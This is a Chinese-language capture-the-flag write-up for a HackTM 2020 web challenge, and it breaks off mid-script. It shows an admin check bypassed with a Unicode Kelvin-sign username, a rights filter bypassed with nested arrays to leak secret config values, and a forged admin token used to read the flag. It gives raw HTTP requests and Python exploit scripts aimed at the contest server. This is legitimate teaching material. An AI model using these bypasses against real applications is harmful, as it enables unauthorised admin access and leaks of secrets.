+<h6 id="req-user-id是由JWT签名的，并且是在登陆的时候由服务器随机生成的。我必须去获得一个签名的token其中的id值是0。如果这个secret被用作签名并且没有暴露因此是安全的。"><a href="#req-user-id是由JWT签名的，并且是在登陆的时候由服务器随机生成的。我必须去获得一个签名的token其中的id值是0。如果这个secret被用作签名并且没有暴露因此是安全的。" class="headerlink" title="req.user.id是由JWT签名的，并且是在登陆的时候由服务器随机生成的。我必须去获得一个签名的token其中的id值是0。如果这个secret被用作签名并且没有暴露因此是安全的。"></a><code>req.user.id</code>是由JWT签名的，并且是在登陆的时候由服务器随机生成的。我必须去获得一个签名的token其中的<code>id</code>值是0。如果这个<code>secret</code>被用作签名并且没有暴露因此是安全的。</h6><h6 id="在其他的地方只有一个地方返回了签名的JWT是-init"><a href="#在其他的地方只有一个地方返回了签名的JWT是-init" class="headerlink" title="在其他的地方只有一个地方返回了签名的JWT是/init:"></a>在其他的地方只有一个地方返回了签名的<code>JWT</code>是<code>/init</code>:</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> adminId = pwHash</span><br><span class="line">    .split(<span class="string">""</span>)</span><br><span class="line">    .map(<span class="function">(<span class="params">c, i</span>) =&gt;</span> c.charCodeAt(<span class="number">0</span>) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b);</span><br><span class="line">    </span><br><span class="line">  res.json(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: adminId &#125;) &#125;));</span><br></pre></td></tr></table></figure>
+
+<h6 id="为了让adminId为0，我们需要target-xor-pwHash-0这意味着target-pwHash。"><a href="#为了让adminId为0，我们需要target-xor-pwHash-0这意味着target-pwHash。" class="headerlink" title="为了让adminId为0，我们需要target xor pwHash=0这意味着target===pwHash。"></a>为了让<code>adminId</code>为0，我们需要<code>target xor pwHash=0</code>这意味着<code>target===pwHash</code>。</h6><ul>
+<li><code>target</code>是这个<code>config.n</code>的md5和。</li>
+<li><code>pwHash</code>是这个<code>q*p</code>的md5和。</li>
+</ul>
+<h6 id="我们需要得到config-n。"><a href="#我们需要得到config-n。" class="headerlink" title="我们需要得到config.n。"></a>我们需要得到<code>config.n</code>。</h6><h6 id="现在我们继续往下看。"><a href="#现在我们继续往下看。" class="headerlink" title="现在我们继续往下看。"></a>现在我们继续往下看。</h6><h6 id="我们可以看到-serverInfo返回了一些在config的元素："><a href="#我们可以看到-serverInfo返回了一些在config的元素：" class="headerlink" title="我们可以看到/serverInfo返回了一些在config的元素："></a>我们可以看到<code>/serverInfo</code>返回了一些在<code>config</code>的元素：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">"/serverInfo"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> user = users[req.user.id] || &#123; <span class="attr">rights</span>: [] &#125;;</span><br><span class="line">  <span class="keyword">let</span> info = user.rights.map(<span class="function"><span class="params">i</span> =&gt;</span> (&#123; <span class="attr">name</span>: i, <span class="attr">value</span>: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; <span class="attr">info</span>: info &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="每个用户的默认权限是：-quot-message-quot-quot-height-quot-quot-width-quot-quot-version-quot-quot-usersOnline-quot-quot-adminUsername-quot-quot-backgroundColor-quot"><a href="#每个用户的默认权限是：-quot-message-quot-quot-height-quot-quot-width-quot-quot-version-quot-quot-usersOnline-quot-quot-adminUsername-quot-quot-backgroundColor-quot" class="headerlink" title="每个用户的默认权限是：[ &quot;message&quot;, &quot;height&quot;, &quot;width&quot;, &quot;version&quot;, &quot;usersOnline&quot;, &quot;adminUsername&quot;, &quot;backgroundColor&quot; ]"></a>每个用户的默认权限是：<code>[ &quot;message&quot;, &quot;height&quot;, &quot;width&quot;, &quot;version&quot;, &quot;usersOnline&quot;, &quot;adminUsername&quot;, &quot;backgroundColor&quot; ]</code></h6><h6 id="我们需要去添加n和p到我们的用户权限列表中。"><a href="#我们需要去添加n和p到我们的用户权限列表中。" class="headerlink" title="我们需要去添加n和p到我们的用户权限列表中。"></a>我们需要去添加<code>n</code>和<code>p</code>到我们的用户权限列表中。</h6><h6 id="这个方法-updateUser允许我们去发送一个权限列表以添加到我们的用户权限列表中。"><a href="#这个方法-updateUser允许我们去发送一个权限列表以添加到我们的用户权限列表中。" class="headerlink" title="这个方法/updateUser允许我们去发送一个权限列表以添加到我们的用户权限列表中。"></a>这个方法<code>/updateUser</code>允许我们去发送一个权限列表以添加到我们的用户权限列表中。</h6><h6 id="但是但我们POST-quot-p-quot-quot-n-quot-时：返回You-39-re-not-an-admin-。"><a href="#但是但我们POST-quot-p-quot-quot-n-quot-时：返回You-39-re-not-an-admin-。" class="headerlink" title="但是但我们POST[&quot;p&quot;,&quot;n&quot;]时：返回You&#39;re not an admin!。"></a>但是但我们POST<code>[&quot;p&quot;,&quot;n&quot;]</code>时：返回<code>You&#39;re not an admin!</code>。</h6><h6 id="我们可以看看他是怎么处理的："><a href="#我们可以看看他是怎么处理的：" class="headerlink" title="我们可以看看他是怎么处理的："></a>我们可以看看他是怎么处理的：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!user || !isAdmin(user)) &#123;</span><br><span class="line">  res.json(err(<span class="string">"You're not an admin!"</span>));</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="Bypassing-isAdmin-u"><a href="#Bypassing-isAdmin-u" class="headerlink" title="Bypassing isAdmin(u)"></a>Bypassing isAdmin(u)</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们需要去使username-toLowerCase-adminUsername-toLowerCase-。"><a href="#我们需要去使username-toLowerCase-adminUsername-toLowerCase-。" class="headerlink" title="我们需要去使username.toLowerCase() === adminUsername.toLowerCase()。"></a>我们需要去使<code>username.toLowerCase() === adminUsername.toLowerCase()</code>。</h6><h6 id="如果我们尝试去登陆-login-使用hacktm我们将会获取下面的信息："><a href="#如果我们尝试去登陆-login-使用hacktm我们将会获取下面的信息：" class="headerlink" title="如果我们尝试去登陆(/login)使用hacktm我们将会获取下面的信息："></a>如果我们尝试去登陆(<code>/login</code>)使用<code>hacktm</code>我们将会获取下面的信息：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invalid creds</span><br></pre></td></tr></table></figure>
+
+<h6 id="他是由于isValidUser-u-在-login。它检查："><a href="#他是由于isValidUser-u-在-login。它检查：" class="headerlink" title="他是由于isValidUser(u)在/login。它检查："></a>他是由于<code>isValidUser(u)</code>在<code>/login</code>。它检查：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br></pre></td></tr></table></figure>
+
+<h6 id="因此，我们需要："><a href="#因此，我们需要：" class="headerlink" title="因此，我们需要："></a>因此，我们需要：</h6><ul>
+<li><code>u.username.toUpperCase() !== config.adminUsername.toUpperCase()</code></li>
+<li><code>username.toLowerCase() === adminUsername.toLowerCase()</code></li>
+</ul>
+<h6 id="幸运的是，unicode为我们提供一些字符满足下面的这些情况："><a href="#幸运的是，unicode为我们提供一些字符满足下面的这些情况：" class="headerlink" title="幸运的是，unicode为我们提供一些字符满足下面的这些情况："></a>幸运的是，unicode为我们提供一些字符满足下面的这些情况：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&quot;K&quot;.toUpperCase() = &quot;K&quot;</span><br><span class="line">&quot;K&quot;.toLowerCase() = &quot;k&quot;</span><br><span class="line">``` </span><br><span class="line">###### 这意味着：`isValidUser(&quot;hacKtm&quot;)`是`true`并且`isAdmin(&quot;hacKtm&quot;)`也是`true`。</span><br><span class="line">###### 我们POST到`/login`:</span><br><span class="line">```text</span><br><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: 167.172.165.153:60001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Authorization: Bearer undefined</span><br><span class="line">Content-Length: 23</span><br><span class="line">Origin: http://167.172.165.153:60000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://167.172.165.153:60000/</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;hacKtm&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们获得了下列的JWT"><a href="#我们获得了下列的JWT" class="headerlink" title="我们获得了下列的JWT:"></a>我们获得了下列的JWT:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 199</span><br><span class="line">ETag: W/&quot;c7-FOLFBWmzAHyWeAJOurHR3CgFQ7w&quot;</span><br><span class="line">Date: Fri, 07 Feb 2020 11:57:47 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImRmZjNkYzBiLWI2ZmQtNDk0ZS04YThiLTMyOWZjNjAwZjRmYiIsImlhdCI6MTU4MTA3NjY2N30.wa1XTEXY6XbTr8M0XL2vGgHtTGjTDwViCK3tu2nPIJs&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="现在我们能更新我们的权限！"><a href="#现在我们能更新我们的权限！" class="headerlink" title="现在我们能更新我们的权限！"></a>现在我们能更新我们的权限！</h6><h6 id="但是我们尝试去POST-quot-p-quot-quot-n-quot-到-updateUser："><a href="#但是我们尝试去POST-quot-p-quot-quot-n-quot-到-updateUser：" class="headerlink" title="但是我们尝试去POST[&quot;p&quot;,&quot;n&quot;]到/updateUser："></a>但是我们尝试去POST<code>[&quot;p&quot;,&quot;n&quot;]</code>到<code>/updateUser</code>：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /updateUser HTTP/1.1</span><br><span class="line">Host: 167.172.165.153:60001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImRmZjNkYzBiLWI2ZmQtNDk0ZS04YThiLTMyOWZjNjAwZjRmYiIsImlhdCI6MTU4MTA3NjY2N30.wa1XTEXY6XbTr8M0XL2vGgHtTGjTDwViCK3tu2nPIJs</span><br><span class="line">Content-Length: 22</span><br><span class="line">Origin: http://167.172.165.153:60000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://167.172.165.153:60000/</span><br><span class="line"></span><br><span class="line">&#123;&quot;rights&quot;: [&quot;n&quot;, &quot;p&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="将会返回如下内容："><a href="#将会返回如下内容：" class="headerlink" title="将会返回如下内容："></a>将会返回如下内容：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 205</span><br><span class="line">ETag: W/&quot;cd-ZjJARGQw8OB8MX5BzYLl/dWOAKM&quot;</span><br><span class="line">Date: Fri, 07 Feb 2020 12:09:55 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;user&quot;:&#123;&quot;username&quot;:&quot;hacKtm&quot;,&quot;id&quot;:&quot;dff3dc0b-b6fd-494e-8a8b-329fc600f4fb&quot;,&quot;color&quot;:0,&quot;rights&quot;:[&quot;message&quot;,&quot;height&quot;,&quot;width&quot;,&quot;version&quot;,&quot;usersOnline&quot;,&quot;adminUsername&quot;,&quot;backgroundColor&quot;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="虽然没有报错，但是n和p没有被添加到用户权限列表中。"><a href="#虽然没有报错，但是n和p没有被添加到用户权限列表中。" class="headerlink" title="虽然没有报错，但是n和p没有被添加到用户权限列表中。"></a>虽然没有报错，但是<code>n</code>和<code>p</code>没有被添加到用户权限列表中。</h6><h6 id="这是因为checkRights-arr-。"><a href="#这是因为checkRights-arr-。" class="headerlink" title="这是因为checkRights(arr)。"></a>这是因为<code>checkRights(arr)</code>。</h6><h6 id="Bypassing-chkecRights-arr"><a href="#Bypassing-chkecRights-arr" class="headerlink" title="Bypassing chkecRights(arr)"></a>Bypassing chkecRights(arr)</h6><h6 id="在-updateUser"><a href="#在-updateUser" class="headerlink" title="在/updateUser():"></a>在<code>/updateUser()</code>:</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rights.length &gt; <span class="number">0</span> &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">   users[uid].rights = user.rights.concat(rights).filter(onlyUnique);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="这个checkRights返回了false由于rights包含这个字符串-quot-n-quot-quot-p-quot-。"><a href="#这个checkRights返回了false由于rights包含这个字符串-quot-n-quot-quot-p-quot-。" class="headerlink" title="这个checkRights返回了false由于rights包含这个字符串&quot;n&quot;/&quot;p&quot;。"></a>这个<code>checkRights</code>返回了false由于<code>rights</code>包含这个字符串<code>&quot;n&quot;/&quot;p&quot;</code>。</h6><h6 id="我们可以提供下面的两个事实来解决："><a href="#我们可以提供下面的两个事实来解决：" class="headerlink" title="我们可以提供下面的两个事实来解决："></a>我们可以提供下面的两个事实来解决：</h6><ul>
+<li><code>javascript</code>使用<code>toString()</code>去访问对象的属性。</li>
+<li>具有一个元素的数组<code>toString</code>是<code>toString</code>，例如：<code>[&quot;n&quot;].toString()=&gt;&quot;n&quot;</code>。</li>
+</ul>
+<h6 id="当我们POST-quot-p-quot-quot-n-quot-到-updateUser会返回如下内容："><a href="#当我们POST-quot-p-quot-quot-n-quot-到-updateUser会返回如下内容：" class="headerlink" title="当我们POST[[&quot;p&quot;],&quot;n&quot;]到/updateUser会返回如下内容："></a>当我们POST<code>[[&quot;p&quot;],&quot;n&quot;]</code>到<code>/updateUser</code>会返回如下内容：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 217</span><br><span class="line">ETag: W/&quot;d9-uCy43hPNMI1ebwEnfBO1u7Arbg8&quot;</span><br><span class="line">Date: Fri, 07 Feb 2020 12:24:10 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;user&quot;:&#123;&quot;username&quot;:&quot;hacKtm&quot;,&quot;id&quot;:&quot;dff3dc0b-b6fd-494e-8a8b-329fc600f4fb&quot;,&quot;color&quot;:0,&quot;rights&quot;:[&quot;message&quot;,&quot;height&quot;,&quot;width&quot;,&quot;version&quot;,&quot;usersOnline&quot;,&quot;adminUsername&quot;,&quot;backgroundColor&quot;,[&quot;n&quot;],[&quot;p&quot;]]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="现在我们访问-serverInfo"><a href="#现在我们访问-serverInfo" class="headerlink" title="现在我们访问/serverInfo:"></a>现在我们访问<code>/serverInfo</code>:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;info&quot;:[&#123;&quot;name&quot;:&quot;message&quot;,&quot;value&quot;:&quot;Hello there!&quot;&#125;,&#123;&quot;name&quot;:&quot;height&quot;,&quot;value&quot;:80&#125;,&#123;&quot;name&quot;:&quot;width&quot;,&quot;value&quot;:120&#125;,&#123;&quot;name&quot;:&quot;version&quot;,&quot;value&quot;:5e-324&#125;,&#123;&quot;name&quot;:&quot;usersOnline&quot;,&quot;value&quot;:12&#125;,&#123;&quot;name&quot;:&quot;adminUsername&quot;,&quot;value&quot;:&quot;hacktm&quot;&#125;,&#123;&quot;name&quot;:&quot;backgroundColor&quot;,&quot;value&quot;:8947848&#125;,&#123;&quot;name&quot;:[&quot;n&quot;],&quot;value&quot;:&quot;54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979&quot;&#125;,&#123;&quot;name&quot;:[&quot;p&quot;],&quot;value&quot;:&quot;192342359675101460380863753759239746546129652637682939698853222883672421041617811211231308956107636139250667823711822950770991958880961536380231512617&quot;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="Getting-the-flag"><a href="#Getting-the-flag" class="headerlink" title="Getting the flag"></a>Getting the flag</h6><h6 id="计算q使用n-p我们获得："><a href="#计算q使用n-p我们获得：" class="headerlink" title="计算q使用n/p我们获得："></a>计算<code>q</code>使用<code>n/p</code>我们获得：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q = 283463585975138667365296941492014484422030788964145259030277643596460860183630041214426435642097873422136064628904111949258895415157497887086501927987</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们POSTp和q到-init并且返回："><a href="#我们POSTp和q到-init并且返回：" class="headerlink" title="我们POSTp和q到/init并且返回："></a>我们POST<code>p</code>和<code>q</code>到<code>/init</code>并且返回：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 150</span><br><span class="line">ETag: W/&quot;96-RDz7xTme21gWlV49DxgadRCF8Cs&quot;</span><br><span class="line">Date: Fri, 07 Feb 2020 13:08:28 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgxMDgwOTA4fQ.6e046oNRejSwF6ymM2BaxwxvTq7y42J6jfv5bnKzj1Q&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9-eyJpZCI6MCwiaWF0IjoxNTgxMDgwOTA4fQ-6e046oNRejSwF6ymM2BaxwxvTq7y42J6jfv5bnKzj1Q是admin的token。"><a href="#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9-eyJpZCI6MCwiaWF0IjoxNTgxMDgwOTA4fQ-6e046oNRejSwF6ymM2BaxwxvTq7y42J6jfv5bnKzj1Q是admin的token。" class="headerlink" title="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgxMDgwOTA4fQ.6e046oNRejSwF6ymM2BaxwxvTq7y42J6jfv5bnKzj1Q是admin的token。"></a><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgxMDgwOTA4fQ.6e046oNRejSwF6ymM2BaxwxvTq7y42J6jfv5bnKzj1Q</code>是admin的token。</h6><h6 id="GET-flag使用admin的token："><a href="#GET-flag使用admin的token：" class="headerlink" title="GET/flag使用admin的token："></a>GET<code>/flag</code>使用admin的token：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;status&quot;: &quot;ok&quot;,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;flag&quot;: &quot;HackTM&#123;Draw_m3_like_0ne_of_y0ur_japan3se_girls&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="测试代码如下："><a href="#测试代码如下：" class="headerlink" title="测试代码如下："></a>测试代码如下：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> admin = <span class="string">"hacktm"</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="string">"hacKtm"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Username: "</span> + user);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"isAdmin: "</span> + (user.toLowerCase() == admin.toLowerCase()));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"isValidUser: "</span> + (user.toUpperCase() !== admin.toUpperCase()));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// var uc_arr = admin.toUpperCase().split("");</span></span><br><span class="line"><span class="comment">// var lc_arr = admin.toLowerCase().split("");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// for(i=0;i&lt;100000;i++)&#123;</span></span><br><span class="line"><span class="comment">//     var c = String.fromCharCode(i);</span></span><br><span class="line"><span class="comment">//     if (uc_arr.includes(c.toUpperCase()) || lc_arr.includes(c.toLowerCase()))&#123;</span></span><br><span class="line"><span class="comment">//         console.log(i, c, c.toUpperCase(), c.toLowerCase());</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="slove-py"><a href="#slove-py" class="headerlink" title="slove.py"></a>slove.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://167.172.165.153:60001"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create user with the admin username</span></span><br><span class="line">resp = requests.post(url + <span class="string">"/login"</span>,</span><br><span class="line">                     json=&#123;<span class="string">"username"</span>: <span class="string">"hacKtm"</span>&#125;)</span><br><span class="line">resp.raise_for_status()</span><br><span class="line">token = resp.json()[<span class="string">'data'</span>][<span class="string">'token'</span>]</span><br><span class="line">print(<span class="string">"[*] Created user with admin username"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add illegal rights</span></span><br><span class="line">resp = requests.post(url + <span class="string">"/updateUser"</span>,</span><br><span class="line">                     json=&#123;<span class="string">"rights"</span>: [[<span class="string">"n"</span>], [<span class="string">"p"</span>]]&#125;,</span><br><span class="line">                     headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">resp.raise_for_status()</span><br><span class="line">print(<span class="string">"[*] updated rights"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fetch secret config values</span></span><br><span class="line">resp = requests.get(url + <span class="string">"/serverInfo"</span>,</span><br><span class="line">                    headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">resp.raise_for_status()</span><br><span class="line">print(<span class="string">"[*] fetched secret config values"</span>)</span><br><span class="line">print(resp.text)</span><br><span class="line">server_info = resp.json()</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> server_info[<span class="string">"data"</span>][<span class="string">"info"</span>]:</span><br><span class="line">    <span class="keyword">if</span> isinstance(key[<span class="string">"name"</span>], list):</span><br><span class="line">        print(<span class="string">"[*] %s = %s"</span> % (key[<span class="string">"name"</span>][<span class="number">0</span>], key[<span class="string">"value"</span>]))</span><br></pre></td></tr></table></figure>
+
+<h6 id="payload-py"><a href="#payload-py" class="headerlink" title="payload.py"></a>payload.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt  <span class="comment"># pip install pyjwt</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://167.172.165.153:60001"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"p"</span>: <span class="string">"54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979"</span>,</span><br><span class="line">    <span class="string">"q"</span>: <span class="string">"1"</span></span><br><span 